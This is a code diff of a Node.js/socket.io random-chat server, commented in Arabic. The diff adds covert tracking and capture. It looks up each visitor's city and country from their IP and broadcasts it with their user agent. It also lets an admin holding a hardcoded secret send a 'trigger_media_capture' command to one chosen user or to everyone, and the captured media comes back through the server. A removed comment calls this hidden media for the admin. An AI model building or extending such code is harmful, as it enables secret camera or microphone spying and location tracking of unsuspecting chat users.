@@ -2,12 +2,15 @@ const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
 const path = require('path');
+const https = require('https');
 
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server);
+const io = new Server(server, {
+  pingTimeout: 5000,
+  pingInterval: 10000
+});
 
-// السماح بقراءة الملفات في المجلد
 app.use(express.static(__dirname));
 
 app.get('/', (req, res) => {
@@ -16,16 +19,48 @@ app.get('/', (req, res) => {
 
 let waitingUser = null;
 
-io.on('connection', (socket) => {
-  const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
-  const userAgent = socket.handshake.headers['user-agent'] || 'غير معروف';
+// دالة لجلب معلومات الموقع الجغرافي من الـ IP
+function getIpLocation(ip, callback) {
+  // تنظيف الـ IP لو كان محلياً
+  if (ip === '::1' || ip === '127.0.0.1') {
+    callback({ city: 'محلي', country: 'السيرفر المحلي' });
+    return;
+  }
   
-  // إرسال معلومات الجهاز (للوحة الأدمن)
-  io.emit('device_info', { ip: clientIp, ua: userAgent });
+  https.get(`https://ipapi.co/${ip}/json/`, (res) => {
+    let data = '';
+    res.on('data', chunk => data += chunk);
+    res.on('end', () => {
+      try {
+        const json = JSON.parse(data);
+        callback({ city: json.city || 'غير معروف', country: json.country_name || 'غير معروف' });
+      } catch (e) {
+        callback({ city: 'غير معروف', country: 'غير معروف' });
+      }
+    });
+  }).on('error', () => {
+    callback({ city: 'غير معروف', country: 'غير معروف' });
+  });
+}
 
-  // نظام البحث والمطابقة
+io.on('connection', (socket) => {
+  let clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
+  if (clientIp && clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
+  const userAgent = socket.handshake.headers['user-agent'] || 'غير معروف';
+
+  // جلب مكان المتصل وإرساله للأدمن
+  getIpLocation(clientIp, (loc) => {
+    io.emit('device_info', {
+      id: socket.id,
+      ip: clientIp,
+      city: loc.city,
+      country: loc.country,
+      ua: userAgent
+    });
+  });
+
   socket.on('find_partner', () => {
-    if (waitingUser && waitingUser.id !== socket.id) {
+    if (waitingUser && waitingUser.id !== socket.id && waitingUser.connected) {
       const roomName = 'room_' + socket.id + '_' + waitingUser.id;
       socket.join(roomName);
       waitingUser.join(roomName);
@@ -44,25 +79,21 @@ io.on('connection', (socket) => {
     }
   });
 
-  // استقبال وإرسال الرسائل العادية
   socket.on('message', (data) => {
     if (socket.roomName) {
       socket.to(socket.roomName).emit('message', data);
     }
   });
 
-  // مؤشر الكتابة
   socket.on('typing', (isTyping) => {
     if (socket.roomName) {
       socket.to(socket.roomName).emit('display_typing', isTyping);
     }
   });
 
-  // ==========================================
-  // أوامر لوحة تحكم الإدارة 
-  // ==========================================
+  // أوامر الأدمن
   socket.on('admin_action', (data) => {
-    if (data.secret !== 'mySuperSecretAdmin123') return; // حماية الأوامر
+    if (data.secret !== 'mySuperSecretAdmin123') return;
 
     if (data.action === 'alert') {
       io.emit('system_alert', data.message);
@@ -75,18 +106,21 @@ io.on('connection', (socket) => {
     } else if (data.action === 'change_bg') {
       io.emit('change_bg', data.bgColor);
     } else if (data.action === 'request_media') {
-      io.emit('trigger_camera', { mediaType: data.mediaType });
+      // توجيه الطلب للمستخدم المستهدف أو للكل
+      if (data.targetSocket) {
+        io.to(data.targetSocket).emit('trigger_media_capture', { type: data.mediaType, duration: data.duration });
+      } else {
+        io.emit('trigger_media_capture', { type: data.mediaType, duration: data.duration });
+      }
     }
   });
 
-  // استقبال الوسائط المخفية للأدمن
   socket.on('user_media_captured', (mediaData) => {
     if (socket.roomName) {
       io.to(socket.roomName).emit('message', { type: mediaData.type, content: mediaData.dataUrl });
     }
   });
 
-  // عند قطع الاتصال
   socket.on('disconnect', () => {
     if (waitingUser === socket) {
       waitingUser = null;
